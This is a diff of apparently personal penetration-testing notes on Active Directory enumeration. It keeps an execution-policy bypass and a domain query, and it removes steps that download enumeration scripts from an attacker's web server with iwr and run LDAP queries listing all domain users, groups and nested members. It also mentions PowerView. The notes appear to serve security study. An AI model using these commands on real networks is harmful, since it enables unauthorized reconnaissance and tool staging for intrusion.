@@ -25,32 +25,8 @@ Domain Class and GetCurrentDomain (Powershell)
 powershell -ep bypass (IMPORTANT!!!)
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 -----------------------------------------------------
-EITHER
-
-Best way to do this is to run penumeration.ps1 script in ~/Documents/tools, to get the file, just start web server and iwr -uri http://$ip/enumeration.ps1 -Outfile enumeration.ps1
-
-Improving upon enumeration.ps1:
-now there is search function, script file is called function.ps1
-
-iwr -uri http://$ip/function.ps1 -Outfile function.ps1
-
-to run, Import-Module .\function.ps1
-Syntaxes:
-LDAPSearch -LDAPQuery "(samAccountType=805306368)" [enumerate all users in domain]
-LDAPSearch -LDAPQuery "(objectclass=group)" [List all Groups in domain]
-
-foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
-$group.properties | select {$_.cn}, {$_.member}
-} [enumerate every group available as well as displaying user members]
-
-Nested Groups, if discovered
-$nested = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Group Name))"
-
-To view, $nested.properties.member
-repeat process until there is no remaining nested groups
 ```
 
-OR
 ## Run PowerView.ps1
 ```
 first, Import-Module .\PowerView.ps1
